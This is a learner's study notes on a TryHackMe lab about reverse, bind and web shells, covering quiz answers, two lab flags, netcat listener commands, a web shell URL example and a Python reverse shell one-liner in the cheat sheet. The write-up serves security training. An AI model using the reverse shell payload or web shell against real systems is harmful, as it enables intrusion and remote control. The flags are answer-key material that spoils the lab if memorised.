# TryHackMe Room: Shells Overview

**Path:** Offensive Security Tooling  
**Module Type:** Concept + Hands-on (Post-Exploitation)  
**Difficulty:** Beginner  
**Status:** Completed  

---

# Summary

This room introduces **shells**, a critical concept in cybersecurity used by attackers to remotely control compromised systems.

It covers:
- Reverse shells  
- Bind shells  
- Web shells  
- Shell payloads  
- Listeners  

> Shells are the **bridge between exploitation and full system control**

---

# Rooms in This Module

| Order | Section | Focus | Status |
|------|--------|------|--------|
| 1 | Introduction | Context & objectives | ✔ |
| 2 | Shell Overview | Fundamentals | ✔ |
| 3 | Reverse Shell | Outbound connection | ✔ |
| 4 | Bind Shell | Inbound connection | ✔ |
| 5 | Listeners | Receiving shells | ✔ |
| 6 | Payloads | Shell generation | ✔ |
| 7 | Web Shell | Web-based execution | ✔ |
| 8 | Practical | Exploitation | ✔ |
| 9 | Conclusion | Recap | ✔ |

---

# Key Concepts Covered

- Remote command execution  
- Reverse vs Bind shell behavior  
- Post-exploitation workflow  
- Command injection  
- File upload exploitation  
- Shell stabilization  

---

# Room Notes & Task Breakdown

---

## Task 1: Introduction

**Objective:**  
Understand role of shells in attacks.

---

### Key Learning

- Shell = interface to interact with OS  
- Used after exploitation  
- Enables full system control  

---

### Insight

> Exploit gets access, shell gives control

---

### Common Struggles

- Confusing shell vs exploit  
- Not understanding attack chain  

---

## Task 2: Shell Overview

---

### Q1: CLI to interact with OS?

`Shell`  

**Explanation:**  
Interface used to execute commands.

---

### Q2: Using compromised system to attack others?

`Pivoting`  

**Explanation:**  
Using one machine to move laterally.

---

### Q3: Escalating privileges activity?

`Privilege Escalation`  

**Explanation:**  
Gaining higher-level access.

---

### Key Insight

- Shell enables:
  - Persistence  
  - Data exfiltration  
  - Lateral movement  

---

### Common Struggles

- Not linking shell → post-exploitation  
- Ignoring attacker workflow  

---

## Task 3: Reverse Shell

---

### Concept

- Target → connects to attacker  
- Bypasses firewall restrictions  

---

### Listener Setup

nc -lvnp 443

---

### Q1: Shell where target connects back?

`Reverse Shell`  

**Explanation:**  
Connection initiated by victim.

---

### Q2: Tool for listener?

`Netcat`  

**Explanation:**  
Used to receive shell connection.

---

### Insight

> Most common shell in real-world attacks :contentReference[oaicite:0]{index=0}  

---

### Common Struggles

- Forgetting listener first  
- Wrong IP/port  
- Firewall issues  

---

## Task 4: Bind Shell

---

### Concept

- Target opens port  
- Attacker connects to it  

---

### Example Flow

Target:

nc -lvp 8080

Attacker:

nc target_ip 8080

---

### Q1: Shell that listens on target?

`Bind Shell`  

**Explanation:**  
Target waits for attacker connection.

---

### Q2: Ports below requiring root?

`1024`  

**Explanation:**  
Privileged ports require elevated access.

---

### Insight

> Less stealthy than reverse shells

---

### Common Struggles

- Port blocked externally  
- Detection risk ignored  

---

## Task 5: Shell Listeners

---

### Tools

- Netcat (nc)  
- Ncat  
- Socat  
- rlwrap  

---

### Q1: Tool for socket connections?

`socat`  

**Explanation:**  
Creates flexible network connections.

---

### Q2: Improves shell interaction?

`rlwrap`  

**Explanation:**  
Adds history + arrow key support.

---

### Q3: Improved Netcat version?

`ncat`  

**Explanation:**  
Supports SSL + advanced features.

---

### Insight

> Listener quality = shell usability

---

### Common Struggles

- Using raw nc without stabilization  
- Poor shell interaction  

---

## Task 6: Shell Payloads

---

### Concept

- Payload = command/script to spawn shell  

---

### Q1: Python module used?

`subprocess`  

**Explanation:**  
Executes system commands.

---

### Q2: Language using exec/system functions?

`PHP`  

**Explanation:**  
Executes commands on web servers.

---

### Q3: Language using env variables + sockets?

`Python`  

**Explanation:**  
Creates reverse shell connections.

---

### Insight

> Payload depends on:
- OS  
- Language support  
- Access method  

---

### Common Struggles

- Using wrong payload for environment  
- Syntax errors  

---

## Task 7: Web Shell

---

### Concept

- Script uploaded to server  
- Executes commands via browser  

---

### Example

shell.php?cmd=whoami

---

### Q1: Vulnerability enabling upload?

`Unrestricted File Upload`  

**Explanation:**  
Allows malicious file upload.

---

### Q2: Malicious uploaded script?

`Web Shell`  

**Explanation:**  
Provides remote command execution.

---

### Insight

> Web shells = stealthy persistence

---

### Common Struggles

- Not understanding execution flow  
- Missing upload vulnerabilities  

---

## Task 8: Practical Exploitation

---

### Q1: Flag via reverse/bind shell

`THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`  

**Explanation:**  
Exploited command injection → gained shell.

---

### Q2: Flag via web shell

`THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`  

**Explanation:**  
Uploaded web shell → executed commands.

---

### Insight

> Multiple paths → same outcome (shell access)

---

### Common Struggles

- Not chaining vulnerability → shell  
- Payload mistakes  
- Missing execution context  

---

## Task 9: Conclusion

- Learned:
  - Reverse shells  
  - Bind shells  
  - Web shells  

---

# Tools Used

- Netcat (nc)  
- Ncat  
- Socat  
- Bash / Python / PHP  

---

# Commands Cheat Sheet

Reverse listener

nc -lvnp 443

Bind shell connect

nc target_ip port

Python reverse shell (short)

python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

---

# Reflection

This module connects everything:

> **Exploitation → Shell → Full Control**

Key takeaways:

- Shell = real compromise  
- Reverse shell = most practical  
- Web shells = persistence method  
- Payload selection is critical  
